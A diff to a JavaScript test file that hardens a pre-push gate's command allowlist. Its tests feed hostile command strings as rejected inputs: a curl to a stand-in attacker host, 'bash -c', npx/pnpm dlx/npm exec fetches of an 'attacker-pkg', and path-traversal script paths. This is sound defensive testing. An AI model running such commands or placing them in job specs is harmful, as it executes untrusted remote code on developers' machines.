@@ -67,17 +67,41 @@ for (const [label, cmd] of SHELL_SHAPED) {
   });
 }
 
-test('refuses an executable that is not on the allowlist', () => {
-  assert.throws(() => toArgv('poisoned', 'curl http://evil.example/x'), /not on the gate allowlist/);
-  assert.throws(() => toArgv('poisoned', 'bash -c whoami'), /not on the gate allowlist/);
-  assert.throws(() => toArgv('poisoned', 'powershell -File x.ps1'), /not on the gate allowlist/);
-  assert.throws(() => toArgv('poisoned', './evil.sh'), /not on the gate allowlist/);
+test('refuses an executable that is not an allowed command form', () => {
+  assert.throws(() => toArgv('poisoned', 'curl http://evil.example/x'), /allowed command form/);
+  assert.throws(() => toArgv('poisoned', 'bash -c whoami'), /allowed command form/);
+  assert.throws(() => toArgv('poisoned', 'powershell -File x.ps1'), /allowed command form/);
+  assert.throws(() => toArgv('poisoned', './evil.sh'), /allowed command form/);
+});
+
+// The hole an argv[0]-only allowlist leaves open. None of these contains a
+// shell metacharacter, and every one of them fetches and runs arbitrary code
+// from a registry — so on an executable-only allowlist a merged edit to the
+// tracked tools/gate-jobs.json would still be RCE on every developer's push.
+test('refuses the registry-fetch forms that pass an executable-only allowlist', () => {
+  assert.throws(() => toArgv('poisoned', 'npx -y attacker-pkg'), /allowed command form/);
+  assert.throws(() => toArgv('poisoned', 'npx attacker-pkg'), /allowed command form/);
+  assert.throws(() => toArgv('poisoned', 'pnpm dlx attacker-pkg'), /allowed command form/);
+  assert.throws(() => toArgv('poisoned', 'npm exec attacker-pkg'), /allowed command form/);
+  // `node` is allowed, but only to run a repo script — not an arbitrary path.
+  assert.throws(() => toArgv('poisoned', 'node /tmp/evil.js'), /allowed command form/);
+  assert.throws(() => toArgv('poisoned', 'node scripts/../../evil.cjs'), /allowed command form/);
+  // `pnpm run` is allowed, but a script name is a name, not a path or a flag.
+  assert.throws(() => toArgv('poisoned', 'pnpm run ../evil'), /allowed command form/);
 });
 
 test('accepts the plain argv invocations the gate legitimately runs', () => {
   assert.deepEqual(toArgv('a', 'pnpm run test'), ['pnpm', 'run', 'test']);
   assert.deepEqual(toArgv('b', 'node scripts/x.cjs --ci'), ['node', 'scripts/x.cjs', '--ci']);
-  assert.deepEqual(toArgv('c', '  cargo   fmt  --check '), ['cargo', 'fmt', '--check']);
+  assert.deepEqual(toArgv('c', '  pnpm   run   test:scripts '), ['pnpm', 'run', 'test:scripts']);
+});
+
+// The gate is only as good as the spec it actually ships with: if a real job
+// stops matching an allowed form, the gate refuses and every push fails closed.
+test('every job in the shipped tools/gate-jobs.json matches an allowed form', () => {
+  const spec = JSON.parse(require('fs').readFileSync(require('path').join(__dirname, '..', 'tools', 'gate-jobs.json'), 'utf8'));
+  const jobs = validateSpec(spec);
+  assert.ok(jobs.length > 0, 'the shipped spec must declare at least one job');
 });
 
 test('refuses a job whose id would corrupt the id<TAB>argv wire format', () => {
